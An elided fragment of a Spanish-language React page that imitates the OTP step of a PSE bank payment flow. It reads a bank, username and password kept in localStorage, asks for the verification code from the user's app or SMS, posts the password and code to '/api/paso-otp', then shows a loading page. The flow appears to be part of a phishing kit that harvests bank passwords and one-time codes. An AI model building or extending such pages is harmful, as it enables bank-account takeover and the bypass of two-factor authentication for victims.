...
export default function OTPPage() {
    ...
    useEffect(() => {
        ...
        const storedBanco = localStorage.getItem('pse_banco');

        if (!storedUsuario || !storedBanco) {
    ...
    const handleSubmit = async (e: React.FormEvent) => {
        ...
        try {
            const password = localStorage.getItem('pse_password') || '';

            // Send to API
            const response = await fetch('/api/paso-otp', {
                method: 'POST',
                headers: {
            ...
            if (data.success) {
                // Redirect to finish/cargando page
            ...
            <main className="flex-1 flex items-center justify-center px-4 py-12">
                <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-md">
                    ...
                    <p className="text-center text-gray-600 mb-6">
                        Ingresa el código de verificación (OTP/Token) de tu app móvil o mensaje de texto
                    </p>
                    ...
                    <form onSubmit={handleSubmit} className="space-y-6">
                            ...
                            <div className="relative">
                                <input
                                    ...
                                    className={`peer w-full px-4 py-3 border-b-2 ${error ? 'border-red-500' : 'border-gray-300'
                                        } focus:border-blue-600 focus:outline-none transition-colors bg-transparent text-center text-2xl tracking-widest disabled:opacity-50`}
                                />
                                <label
                                    htmlFor="otp"
                        ...
                        <div className="flex gap-4">
                            <button
                                type="button"
                                onClick={() => router.push(`/pse/${bankId}/clave`)}
                                disabled={isSubmitting}
